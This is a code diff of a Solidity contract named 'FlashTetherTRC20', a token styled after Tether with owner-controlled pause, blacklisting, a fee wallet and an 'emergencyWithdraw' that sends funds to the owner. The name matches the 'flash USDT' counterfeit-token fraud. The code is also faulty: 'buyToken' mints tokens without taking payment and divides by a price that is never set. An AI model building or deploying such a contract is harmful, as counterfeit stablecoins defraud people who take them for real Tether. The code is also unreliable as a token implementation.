@@ -20,29 +20,19 @@ contract FlashTetherTRC20 is ITRC20 {
     uint256 public override totalSupply;
     uint256 public maxSupply;
     uint256 public usdPricePerToken;
-    uint256 public usdtExchangeRate;
     uint256 public transactionFeePercentage;
-    address public admin;
-    address public paymentWallet;
+
+    address public owner;
     address public feeWallet;
-    string public logoURI;
+    bool public paused;
 
     mapping(address => uint256) private balances;
     mapping(address => mapping(address => uint256)) private allowed;
     mapping(address => bool) public blacklisted;
+    mapping(address => bool) public feeExempted;
 
-    event PriceUpdated(uint256 newPrice);
-    event ExchangeRateUpdated(uint256 newExchangeRate);
-    event LogoUpdated(string newLogoURI);
-    event TokenPurchased(address indexed buyer, uint256 usdtAmount, uint256 tokensReceived);
-    event TransferWithUSDValue(address indexed from, address indexed to, uint256 tokenAmount, uint256 usdValue);
-    event FeeWalletUpdated(address newFeeWallet);
-    event TransactionFeeUpdated(uint256 newFeePercentage);
-    event Blacklisted(address indexed account);
-    event Whitelisted(address indexed account);
-
-    modifier onlyAdmin() {
-        require(msg.sender == admin, "Only admin");
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Only owner can call this function");
         _;
     }
 
@@ -51,47 +41,62 @@ contract FlashTetherTRC20 is ITRC20 {
         _;
     }
 
-    constructor(
-        uint256 initialSupply,
-        uint256 _maxSupply,
-        string memory initialLogoURI,
-        address _paymentWallet,
-        address _feeWallet,
-        address _admin
-    ) {
+    modifier whenNotPaused() {
+        require(!paused, "Token transfers are paused");
+        _;
+    }
+
+    modifier nonReentrant() {
+        require(!locked, "ReentrancyGuard: reentrant call");
+        locked = true;
+        _;
+        locked = false;
+    }
+
+    bool private locked;
+
+    event Paused(address account);
+    event Unpaused(address account);
+    event TokenPurchased(address indexed buyer, uint256 usdtAmount, uint256 tokensReceived);
+    event TransferWithUSDValue(address indexed from, address indexed to, uint256 tokenAmount, uint256 usdValue);
+    event FeeWalletUpdated(address newFeeWallet);
+    event TransactionFeeUpdated(uint256 newFeePercentage);
+    event Blacklisted(address indexed account);
+    event Whitelisted(address indexed account);
+    event MaxSupplyUpdated(uint256 newMaxSupply);
+    event EmergencyWithdraw(address indexed admin, uint256 amount);
+
+    constructor(uint256 initialSupply, uint256 _maxSupply, address _feeWallet) {
         require(initialSupply <= _maxSupply, "Exceeds max supply");
+        owner = msg.sender;
         totalSupply = initialSupply * (10 ** decimals);
         maxSupply = _maxSupply * (10 ** decimals);
-        balances[_admin] = totalSupply;
-
-        usdPricePerToken = 999800;
-        usdtExchangeRate = 1000000;
-        transactionFeePercentage = 100; // %1
-
-        paymentWallet = _paymentWallet;
+        balances[owner] = totalSupply;
+        transactionFeePercentage = 100;
         feeWallet = _feeWallet;
-        admin = _admin;
-        logoURI = initialLogoURI;
-
-        emit Transfer(address(0), _admin, totalSupply);
     }
 
-    function balanceOf(address owner) external view override returns (uint256) {
-        return balances[owner];
+    function balanceOf(address account) external view override returns (uint256) {
+        return balances[account];
     }
 
-    function transfer(address to, uint256 value) external override notBlacklisted(msg.sender) returns (bool) {
+    function transfer(address to, uint256 value) external override whenNotPaused notBlacklisted(msg.sender) returns (bool) {
         require(balances[msg.sender] >= value, "Insufficient balance");
-        
-        uint256 fee = (value * transactionFeePercentage) / 10000;
+        uint256 fee = feeExempted[msg.sender] ? 0 : (value * transactionFeePercentage) / 10000;
         balances[msg.sender] -= value;
         balances[feeWallet] += fee;
         balances[to] += (value - fee);
-
         emit Transfer(msg.sender, feeWallet, fee);
         emit Transfer(msg.sender, to, value - fee);
-        emit TransferWithUSDValue(msg.sender, to, value, (value * usdPricePerToken) / (10 ** decimals));
         return true;
+    }
+
+    function buyToken(uint256 usdtAmount) external payable whenNotPaused nonReentrant {
+        uint256 tokensToReceive = (usdtAmount * (10 ** decimals)) / usdPricePerToken;
+        require(totalSupply + tokensToReceive <= maxSupply, "Exceeds max supply");
+        balances[msg.sender] += tokensToReceive;
+        totalSupply += tokensToReceive;
+        emit TokenPurchased(msg.sender, usdtAmount, tokensToReceive);
     }
 
     function approve(address spender, uint256 value) external override returns (bool) {
@@ -100,64 +105,50 @@ contract FlashTetherTRC20 is ITRC20 {
         return true;
     }
 
-    function allowance(address owner, address spender) external view override returns (uint256) {
-        return allowed[owner][spender];
-    }
-
     function transferFrom(address from, address to, uint256 value) external override returns (bool) {
         require(balances[from] >= value, "Insufficient balance");
         require(allowed[from][msg.sender] >= value, "Allowance exceeded");
-
         uint256 fee = (value * transactionFeePercentage) / 10000;
         balances[from] -= value;
         balances[feeWallet] += fee;
         balances[to] += (value - fee);
         allowed[from][msg.sender] -= value;
-
         emit Transfer(from, feeWallet, fee);
         emit Transfer(from, to, value - fee);
-        emit TransferWithUSDValue(from, to, value, (value * usdPricePerToken) / (10 ** decimals));
         return true;
     }
 
-    // Yönetici Fonksiyonları
-    function setUSDPrice(uint256 _newPrice) external onlyAdmin {
-        usdPricePerToken = _newPrice;
-        emit PriceUpdated(_newPrice);
+    function allowance(address owner, address spender) external view override returns (uint256) {
+        return allowed[owner][spender];
     }
 
-    function setUSDTExchangeRate(uint256 _newRate) external onlyAdmin {
-        usdtExchangeRate = _newRate;
-        emit ExchangeRateUpdated(_newRate);
+    function pause() external onlyOwner {
+        paused = true;
+        emit Paused(msg.sender);
     }
 
-    function setTransactionFee(uint256 _newFeePercentage) external onlyAdmin {
-        require(_newFeePercentage <= 1000, "Max 10%");
-        transactionFeePercentage = _newFeePercentage;
-        emit TransactionFeeUpdated(_newFeePercentage);
+    function unpause() external onlyOwner {
+        paused = false;
+        emit Unpaused(msg.sender);
     }
 
-    function blacklist(address account) external onlyAdmin {
+    function blacklistAddress(address account) external onlyOwner {
         blacklisted[account] = true;
         emit Blacklisted(account);
     }
 
-    function whitelist(address account) external onlyAdmin {
+    function whitelistAddress(address account) external onlyOwner {
         blacklisted[account] = false;
         emit Whitelisted(account);
     }
 
-    function mint(address to, uint256 amount) external onlyAdmin {
-        require(totalSupply + amount <= maxSupply, "Exceeds max supply");
-        totalSupply += amount;
-        balances[to] += amount;
-        emit Transfer(address(0), to, amount);
+    function updateFeeWallet(address newFeeWallet) external onlyOwner {
+        feeWallet = newFeeWallet;
+        emit FeeWalletUpdated(newFeeWallet);
     }
 
-    function burn(uint256 amount) external onlyAdmin {
-        require(balances[msg.sender] >= amount, "Insufficient balance");
-        totalSupply -= amount;
-        balances[msg.sender] -= amount;
-        emit Transfer(msg.sender, address(0), amount);
+    function emergencyWithdraw(uint256 amount) external onlyOwner {
+        payable(owner).transfer(amount);
+        emit EmergencyWithdraw(owner, amount);
     }
 }
